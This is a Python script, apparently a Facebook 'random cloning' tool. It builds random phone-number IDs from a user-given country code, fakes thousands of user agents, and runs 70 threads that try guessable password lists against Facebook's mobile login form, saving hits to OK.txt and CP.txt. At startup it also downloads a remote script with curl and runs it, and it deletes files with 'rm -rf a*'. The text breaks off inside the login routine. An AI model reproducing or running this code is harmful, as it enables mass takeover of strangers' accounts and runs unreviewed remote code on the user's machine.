#coding=utf
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ugen2=[]
ugen=[]

for xd in range(25000):
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

    #Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    #Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='like Gecko'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/230.0.474234691 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/635.1'
'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.129 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; Pearl K3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; V2026 Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Z981) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 EdgA/105.0.1343.42'
'Mozilla/5.0 (Linux; Android 11; SM-A125W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74'
'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 HuaweiBrowser/12.1.1.324 HMSCore/6.7.0.322'
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0'
'Opera/5.11 (Windows 98; U) [en]'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/6.0 (Windows 2000; U) [fr]'
'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]'
'Opera/7.03 (Windows NT 5.0; U) [en]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/9.02 (Windows XP; U; ru)'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Opera/9.51 (Macintosh; Intel Mac OS X; U; en)'
'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1'
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00'
'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00'
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10'
'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11'
'Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4'
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)'
'Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25'
'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]'
'Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
"Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5647.206 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Magnet_G30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5663.218 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; TVBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5616.215 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5622.208 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Lenovo TB-J606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5667.195 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; e-tab 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5669.213 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; MRX-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5645.215 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.219 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5658.220 Safari/537.36 OPR/97.0.3429.147",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5624.206 Safari/537.36 OPR/97.0.3248.58",]  
		
logo=(f"""
 \033[1;92m .88b  d88. d888888b  .o88b. db   dD db    db 
 \033[1;92m 88'YbdP`88   `88'   d8P  Y8 88 ,8P' `8b  d8' 
 \033[1;32m 88  88  88    88    8P      88,8P    `8bd8'  
 \033[1;32m 88  88  88    88    8b      88`8b      88    
 \033[1;92m 88  88  88   .88.   Y8b  d8 88 `88.    88    
 \033[1;92m YP  YP  YP Y888888P  `Y88P' YP   YD    YP            
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;31m✓\033[1;32m] Author     : M I C K Y
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/PRIVATE 
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : __Micky
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × Random
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35mTesting
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def lines():
	print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	
	BLUE = '\033[1;32m'
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {BLUE}SORRY NO ACTIVE APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {BLUE}YOUR ACTIVE APPLICATION DETAILS:'%(H))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {BLUE}SORRY NO EXPIRED APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {BLUE}YOUR EXPIRED APPLICATION DETAILS:'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
loop = 0
oks = []
cps = []
try:
    print('\n Updating...\n\033[1;37m Please Wait\033[0;97m\n Update don ')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def usman():
	os.system('clear')
	print(logo)
	print('[1] Pak Random Cloning menu')
	print('[2] Bangladish Random Cloning')
	print('[3] Contact with Admin ')
	print('[4] Join Facebook Group')
	print('\x1b[1;91m[5] Exit Main menu')
	print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	usman1 = input('[•] Select option  : ')
	if usman1 =='1':
		os.system('xdg-open https://facebook.com/groups/1079392916067208/')
		annu()
	if usman1 =='5':
		usman()
	if usman1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100089685578320')
	if usman1 =='4':
		os.system('xdg-open https://facebook.com/groups/1079392916067208/');usman()
	if usman1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		usman()

def annu():
    os.system('clear')
    print(logo)
    print('[1] Random Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Random Method \x1b[1;92m2')
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
    print('\x1b[1;91m[4] Go to main menu')
    lines()
    usman1 = input('[+] CHOOSE optION : ')
    if usman1 =='1':
    	m1()
    if usman1 =='2':
    	m2()
    if usman1 =='3':
    	m3()
    if usman1 =='4':
    	usman()
    else:
        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
#
def bangla():
	os.system('clear')
	print(logo)
	print('[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;91m[3] Go to main menu')
	lines()
	usman1 = input('[+] Select option : ')
	if usman1 =='1':
		b1()
	if usman1 =='2':
		b2()
	if usman1 =='3':
		usman()
#def choice()
#

def m1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','free fire','pakistan','alikhan12345','khan1122','khan12','ali123','ali786','jutti123','jutt786','fatima123', 'fatima786'] 
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
def m2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','khan12']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
def m3():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khan786','khan1122','khan12','janjan']
            yaari.submit(rcrack,uid,pwx,tl)

    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
#
def b1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88**,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode]
            yaari.submit(rcrack,uid,pwx,tl)
 
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
def b2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88***,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'freefire','bangladish','free fire']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()

#
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    global agents
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
    'method': 'GET',
    'scheme': 'https',   
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=Mjp2ZM-V91a5xuZUIinFw0bv; sb=Mjp2ZASnm8chMIDfnPjq7I98; dnonce=AWmzA76BhIc4JmfEgw8NKph2QJccw6I41lximIsoPEeh3PAQqlPibycK7_nU530yvtpHNLYZBQG6Z1NmIbeTywEI; m_pixel_ratio=2; wd=360x666; fr=0uNvRR4xgv3G6D6Hz..Bkdjoy.gO.AAA.0.0.BkdjpC.AWXfQdM6-3g',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
